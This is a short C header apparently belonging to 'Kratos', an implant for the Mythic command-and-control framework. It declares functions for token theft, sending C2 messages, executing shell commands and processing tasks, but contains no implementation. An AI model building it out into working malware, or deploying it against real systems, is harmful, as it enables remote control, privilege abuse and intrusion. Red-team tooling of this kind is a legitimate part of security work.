#ifndef KRATOS_UTILS_H
#define KRATOS_UTILS_H

#include <stddef.h>
#include <windows.h>

/* Token primaire volé via steal_token, NULL si aucun. */
extern HANDLE g_stolen_token;

char *base64_encode(const unsigned char *src, size_t len);
char *base64_decode(const char *src, size_t len);
unsigned char *base64_decode_bin(const char *src, size_t len, size_t *out_len);
char *send_c2_message(const char *json_msg);
char *execute_shell(const char *cmd);
char *ConsoleOutputToUTF8(const char *input);
void extract_json_string(const char *json, const char *key, char *buffer,
                         size_t buffer_size);
char *json_escape(const char *str);
char *
process_mythic_response(const char *b64_resp,
                        size_t b64_len); // Returns malloc'd JSON string or NULL
void send_task_response(const char *task_id, const char *raw_output);
int get_integrity_level();
void get_current_display_user(char *display_buffer, size_t size);

#endif // KRATOS_UTILS_H
